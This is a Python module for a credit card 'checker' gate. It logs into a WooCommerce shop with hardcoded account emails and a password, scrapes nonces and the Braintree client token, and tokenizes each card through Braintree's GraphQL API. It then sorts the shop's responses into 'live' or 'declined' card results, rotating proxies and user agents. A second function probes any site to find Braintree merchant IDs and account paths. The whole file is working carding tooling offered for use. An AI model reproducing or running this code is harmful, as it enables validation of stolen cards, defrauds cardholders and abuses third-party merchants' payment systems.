import requests
import re
import random
import string
import json
import base64
import uuid
import logging
import time
from urllib.parse import urlparse
from config import get_proxy_dict, get_random_ua, get_gate_setting, WC_ACCOUNT_PATHS

logger = logging.getLogger(__name__)

REQUEST_TIMEOUT = 30

APPROVED_KEYWORDS = [
    "invalid postal code", "invalid street address", "insufficient funds",
    "nice! new payment method added", "duplicate card exists in the vault",
    "issuer declined", "cvv", "incorrect_cvc", "security code",
    "approve_with_id", "card_velocity", "withdrawal_count",
    "not_sufficient_funds", "avs",
]

_LIVE_RESPONSE_MAP = {
    "insufficient funds": "Insufficient Funds (Live)",
    "not_sufficient_funds": "Insufficient Funds (Live)",
    "invalid postal code": "AVS Mismatch (Card Live)",
    "invalid street address": "AVS Mismatch (Card Live)",
    "avs": "AVS Mismatch (Card Live)",
    "cvv": "CVV Declined (Card Live)",
    "incorrect_cvc": "CVV Declined (Card Live)",
    "security code": "CVV Declined (Card Live)",
    "nice! new payment method added": "Approved - Payment Method Added",
    "duplicate card exists in the vault": "Card Already in Vault (Live)",
    "issuer declined": "Issuer Declined (Card Live)",
    "approve_with_id": "Approved with ID (Live)",
    "card_velocity": "Activity Limit (Live)",
    "withdrawal_count": "Limit Exceeded (Live)",
}

_DECLINE_RESPONSE_MAP = {
    "do not honor": "Do Not Honor",
    "do_not_honor": "Do Not Honor",
    "expired card": "Expired Card",
    "expired_card": "Expired Card",
    "lost card": "Card Reported Lost",
    "lost_card": "Card Reported Lost",
    "stolen card": "Card Reported Stolen",
    "stolen_card": "Card Reported Stolen",
    "pick up card": "Pick Up Card",
    "restricted card": "Restricted Card",
    "restricted_card": "Restricted Card",
    "card declined": "Card Declined",
    "processor declined": "Processor Declined",
    "invalid card number": "Invalid Card Number",
    "incorrect_number": "Invalid Card Number",
    "transaction not allowed": "Transaction Not Allowed",
    "not_permitted": "Transaction Not Permitted",
    "invalid expiration": "Invalid Expiry",
    "no such issuer": "No Such Issuer",
    "suspected fraud": "Suspected Fraud",
    "fraudulent": "Fraud Suspected",
    "testmode_decline": "Test Mode Decline",
    "live_mode_test_card": "Test Card Rejected",
    "call_issuer": "Call Issuer",
    "3d_secure": "3DS Required (Card Live)",
    "three_d_secure": "3DS Required (Card Live)",
    "authentication_required": "3DS Required (Card Live)",
}

_EMAILS = [
    "baign0864@gmail.com", "baignraja8@gmail.com", "baign5033@gmail.com",
    "secure.test.acc1@gmail.com", "secure.test.acc2@gmail.com",
    "secure.test.acc3@gmail.com", "secure.test.acc4@gmail.com",
]


def _rand_code(length=32):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


def _rand_account():
    name = ''.join(random.choices(string.ascii_lowercase, k=20))
    number = ''.join(random.choices(string.digits, k=4))
    return f"{name}{number}@yahoo.com"


def _parse_between(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None


def _bt_auth_result(status, cc, mm, yy, cvv, detail, proxy_used=None, brand="N/A"):
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    if status in ('live', 'charged'):
        label = "Charged" if status == 'charged' else "Approved"
    elif status == 'error':
        label = "Error"
    else:
        label = "Declined"
    return {
        'status': status, 'detail': detail, 'gate': 'Braintree Auth',
        'cc': card_str, 'card': card_str, 'brand': brand,
        'proxy_used': proxy_used,
        'result': f"{label} - {card_str} | {detail}",
    }


def check_braintree_auth(cc, mm, yy, cvv, site_url=None, login_email=None,
                          login_password=None, merchant_id=None):
    site_url = (site_url or get_gate_setting("braintree_auth", "site_url", "") or "https://siglent.co.uk").rstrip('/')
    login_email = login_email or random.choice(_EMAILS)
    login_password = login_password or "God@111983"
    merchant_id = merchant_id or get_gate_setting("braintree_auth", "merchant_id", "wrc3bg2v37npq78r")
    acct_path = get_gate_setting("braintree_auth", "account_path", "")

    if len(yy) == 4 and "20" in yy:
        yy = yy.split("20")[1]
    elif len(yy) == 4:
        yy = yy[2:]
    if len(mm) == 1:
        mm = f"0{mm}"

    if acct_path:
        account_paths = [acct_path] + [p for p in WC_ACCOUNT_PATHS if p != acct_path]
    else:
        account_paths = list(WC_ACCOUNT_PATHS) + ["/my-account/"]

    proxy_used = None
    try:
        proxy_dict = get_proxy_dict()
        if proxy_dict:
            proxy_used = list(proxy_dict.values())[0].replace('http://', '').replace('https://', '')
    except Exception:
        proxy_dict = None

    user_agent = get_random_ua()
    corr = _rand_code()
    sess = _rand_code()
    retries = 3

    pm_path = None
    for ap in account_paths:
        test_url = f'{site_url}{ap}add-payment-method/'
        try:
            test_r = requests.get(test_url, headers={'user-agent': user_agent}, timeout=10, allow_redirects=True, verify=False)
            if test_r.status_code == 200 and ('woocommerce-login-nonce' in test_r.text or 'woocommerce-add-payment-method-nonce' in test_r.text):
                pm_path = f'{ap}add-payment-method/'
                break
        except Exception:
            continue
    if not pm_path:
        pm_path = f'{account_paths[0]}add-payment-method/'

    for attempt in range(retries):
        try:
            r = requests.Session()
            r.proxies = proxy_dict or {}

            headers = {
                'authority': site_url.replace('https://', '').replace('http://', ''),
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
                'cache-control': 'max-age=0',
                'referer': f'{site_url}{pm_path}',
                'user-agent': user_agent,
            }

            r1 = r.get(f'{site_url}{pm_path}', headers=headers, timeout=REQUEST_TIMEOUT)
            nonce_match = re.search(r'id="woocommerce-login-nonce".*?value="(.*?)"', r1.text)
            if not nonce_match:
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
                return _bt_auth_result('error', cc, mm, yy, cvv, 'Login nonce not found', proxy_used)
            nonce = nonce_match.group(1)

            login_headers = headers.copy()
            login_headers.update({
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
            })
            login_data = {
                'username': login_email,
                'password': login_password,
                'rememberme': 'forever',
                'woocommerce-login-nonce': nonce,
                '_wp_http_referer': pm_path,
                'login': 'Log in',
            }
            r.post(f'{site_url}{pm_path}', headers=login_headers, data=login_data, timeout=REQUEST_TIMEOUT)

            r3 = r.get(f'{site_url}{pm_path}', headers=headers, timeout=REQUEST_TIMEOUT)
            noncec_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', r3.text)
            if not noncec_match:
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
                return _bt_auth_result('error', cc, mm, yy, cvv, 'Payment nonce not found', proxy_used)
            noncec = noncec_match.group(1)

            raw_token = _parse_between(r3.text, 'var wc_braintree_client_token = ["', '"];')
            if not raw_token:
                if attempt < retries - 1:
                    time.sleep(3)
                    continue
                return _bt_auth_result('error', cc, mm, yy, cvv, 'BT client token not found', proxy_used)

            try:
                auth_fingerprint = json.loads(base64.b64decode(raw_token))['authorizationFingerprint']
            except Exception:
                return _bt_auth_result('error', cc, mm, yy, cvv, 'Failed to decode BT auth fingerprint', proxy_used)

            gql_headers = {
                'accept': '*/*',
                'authorization': f'Bearer {auth_fingerprint}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': user_agent,
            }

            gql_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': '''
                    mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                        tokenizeCreditCard(input: $input) {
                            token
                            creditCard {
                                bin
                                brandCode
                                last4
                                expirationMonth
                                expirationYear
                                binData {
                                    prepaid
                                    healthcare
                                    debit
                                    durbinRegulated
                                    commercial
                                    payroll
                                    issuingBank
                                    countryOfIssuance
                                    productId
                                }
                            }
                        }
                    }
                ''',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': cc,
                            'expirationMonth': mm,
                            'expirationYear': yy,
                            'cvv': cvv,
                            'billingAddress': {
                                'postalCode': 'NP12 1AE',
                                'streetAddress': '84 High St',
                            },
                        },
                        'options': {'validate': False},
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            r4 = r.post('https://payments.braintree-api.com/graphql', headers=gql_headers, json=gql_data, timeout=REQUEST_TIMEOUT)
            try:
                tok = r4.json()['data']['tokenizeCreditCard']['token']
            except (KeyError, TypeError):
                return _bt_auth_result('error', cc, mm, yy, cvv, 'Tokenization failed', proxy_used)

            submit_headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': site_url,
                'referer': f'{site_url}{pm_path}',
                'user-agent': user_agent,
            }

            config_json = json.dumps({
                "environment": "production",
                "clientApiUrl": f"https://api.braintreegateway.com:443/merchants/{merchant_id}/client_api",
                "assetsUrl": "https://assets.braintreegateway.com",
                "merchantId": merchant_id,
                "graphQL": {"url": "https://payments.braintree-api.com/graphql", "features": ["tokenize_credit_cards"]},
                "challenges": ["cvv"],
                "threeDSecureEnabled": True,
            })

            submit_data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': tok,
                'braintree_cc_device_data': json.dumps({"device_session_id": sess, "fraud_merchant_id": None, "correlation_id": corr}),
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': config_json,
                'woocommerce-add-payment-method-nonce': noncec,
                '_wp_http_referer': pm_path,
                'woocommerce_add_payment_method': '1',
            }

            r6 = r.post(f'{site_url}{pm_path}', headers=submit_headers, data=submit_data, timeout=REQUEST_TIMEOUT)

            success_match = re.search(r'<div class="woocommerce-message" role="alert">(.*?)</div>', r6.text, re.DOTALL)
            if success_match:
                raw_msg = re.sub(r'<[^<]+?>', '', success_match.group(1)).strip()
                return _bt_auth_result('live', cc, mm, yy, cvv, raw_msg or 'Approved - Payment Method Added', proxy_used)

            error_match = re.search(r'<ul class="woocommerce-error" role="alert">\s*<li>(.*?)</li>', r6.text, re.DOTALL)
            if error_match:
                error_raw = error_match.group(1).strip()
                error_lower = error_raw.lower()
                err_detail = error_raw.split(" Reason: ")[1] if "Reason:" in error_raw else error_raw

                if "wait for 20 seconds" in err_detail:
                    time.sleep(20)
                    return check_braintree_auth(cc, mm, yy, cvv, site_url, login_email, login_password, merchant_id)

                for sig, label in _LIVE_RESPONSE_MAP.items():
                    if sig in error_lower:
                        return _bt_auth_result('live', cc, mm, yy, cvv, label, proxy_used)

                if any(kw in error_lower for kw in APPROVED_KEYWORDS):
                    return _bt_auth_result('live', cc, mm, yy, cvv, err_detail, proxy_used)

                for sig, label in _DECLINE_RESPONSE_MAP.items():
                    if sig in error_lower:
                        status_r = 'live' if '3DS' in label or 'Live' in label else 'declined'
                        return _bt_auth_result(status_r, cc, mm, yy, cvv, label, proxy_used)

                return _bt_auth_result('declined', cc, mm, yy, cvv, err_detail, proxy_used)

            return _bt_auth_result('error', cc, mm, yy, cvv, 'No recognizable response', proxy_used)

        except requests.exceptions.Timeout:
            if attempt < retries - 1:
                time.sleep(3)
                continue
            return _bt_auth_result('error', cc, mm, yy, cvv, 'Request timeout', proxy_used)
        except requests.exceptions.ProxyError:
            if attempt < retries - 1:
                time.sleep(3)
                continue
            return _bt_auth_result('error', cc, mm, yy, cvv, 'Proxy error', proxy_used)
        except Exception as e:
            if attempt < retries - 1:
                time.sleep(3)
                continue
            return _bt_auth_result('error', cc, mm, yy, cvv, str(e)[:150], proxy_used)

    return _bt_auth_result('error', cc, mm, yy, cvv, 'Max retries exceeded', proxy_used)


def setup_braintree_auth_from_url(full_url):
    from config import set_gate_setting as _set_gs

    results = {
        "success": False,
        "errors": [],
        "auto_detected": [],
    }

    full_url = full_url.strip()
    if not full_url.startswith("http"):
        full_url = f"https://{full_url}"

    parsed = urlparse(full_url)
    site_url = f"{parsed.scheme}://{parsed.netloc}"

    new_settings = {}
    try:
        s = requests.Session()
        s.headers.update({'User-Agent': get_random_ua()})

        r = s.get(site_url, verify=False, timeout=15, allow_redirects=True)
        if r.status_code != 200:
            results["errors"].append(f"Site returned HTTP {r.status_code}")
            return results

        results["auto_detected"].append(f"Site URL: {site_url}")
        new_settings["site_url"] = site_url
        all_html = r.text

        probe_pages = ["/my-account-2/", "/my-account/", "/my-account-2/add-payment-method/", "/my-account/add-payment-method/", "/checkout/", "/shop/"]
        for pg in probe_pages:
            try:
                pr = s.get(f"{site_url}{pg}", verify=False, timeout=10, allow_redirects=True)
                if pr.status_code == 200:
                    all_html += "\n" + pr.text
                    results["auto_detected"].append(f"Page probed: {pg}")
            except Exception:
                continue

        for pg_path in ["/my-account-2/", "/my-account/", "/account/"]:
            full_pg = f"{site_url}{pg_path}add-payment-method/"
            try:
                test_r = s.get(full_pg, verify=False, timeout=10, allow_redirects=True)
                if test_r.status_code == 200 and ('woocommerce-login-nonce' in test_r.text.lower() or 'woocommerce-add-payment-method-nonce' in test_r.text.lower()):
                    new_settings["account_path"] = pg_path
                    results["auto_detected"].append(f"Account path: {pg_path}")
                    break
            except Exception:
                continue

        if 'woocommerce-login-nonce' in all_html.lower():
            results["auto_detected"].append("WooCommerce login form: found")
        elif 'woocommerce-register-nonce' in all_html.lower():
            results["auto_detected"].append("WooCommerce register form: found")
        else:
            results["errors"].append("No WooCommerce login/register form found")

        if 'add-payment-method' in all_html.lower() or 'woocommerce-add-payment-method-nonce' in all_html.lower():
            results["auto_detected"].append("Add payment method page: found")

        bt_found = False
        if 'braintree' in all_html.lower():
            bt_found = True
            results["auto_detected"].append("Braintree: detected")
        if 'wc_braintree_client_token' in all_html.lower():
            bt_found = True
            results["auto_detected"].append("WC Braintree client token: found")

        merchant_match = re.search(r'merchants/([a-z0-9]{16})/client_api', all_html)
        if merchant_match:
            mid = merchant_match.group(1)
            new_settings["merchant_id"] = mid
            results["auto_detected"].append(f"Merchant ID: {mid}")

        if not bt_found:
            results["errors"].append("Braintree gateway not detected on site")

        # Deep JS scan: merchant IDs and account paths buried in JS bundles
        try:
            from jsrecon import jsrecon_scan as _jsr
            _jf = _jsr(site_url)
            if _jf:
                if "merchant_id" not in new_settings and _jf["merchant_ids"]:
                    _mid = _jf["merchant_ids"][0]
                    new_settings["merchant_id"] = _mid
                    results["auto_detected"].append(f"JS-Recon merchant ID: {_mid}")
                if not new_settings.get("account_path") and _jf["account_paths"]:
                    _ap = _jf["account_paths"][0]
                    new_settings["account_path"] = _ap
                    results["auto_detected"].append(f"JS-Recon account path: {_ap}")
                if not bt_found and _jf["bt_client_tokens"]:
                    bt_found = True
                    results["auto_detected"].append("JS-Recon BT client token: confirmed Braintree")
                _sigs = set(_jf.get("wc_signals", []))
                if "wc_braintree_client_token" in _sigs:
                    bt_found = True
                    results["auto_detected"].append("JS-Recon WC Braintree token: found")
                if _sigs:
                    results["auto_detected"].append(f"JS-Recon WC: {', '.join(list(_sigs)[:4])}")
        except Exception:
            pass

        has_merchant = "merchant_id" in new_settings
        if bt_found and has_merchant:
            results["success"] = True
            for k, v in new_settings.items():
                _set_gs("braintree_auth", k, v)
            if "account_path" in new_settings:
                _set_gs("braintree_auth", "account_path", new_settings["account_path"])
            results["auto_detected"].append("Set login: /setconfig [id] email [email]")
            results["auto_detected"].append("Set pass: /setconfig [id] password [pwd]")
        elif bt_found:
            for k, v in new_settings.items():
                _set_gs("braintree_auth", k, v)
            results["errors"].append("Merchant ID not found - set via /setconfig [id] merchant [id]")
            results["errors"].append("Login credentials needed: /setconfig [id] email/password")
        else:
            results["errors"].append("Setup incomplete - Braintree not found")

    except Exception as e:
        results["errors"].append(f"Setup error: {str(e)[:80]}")

    return results
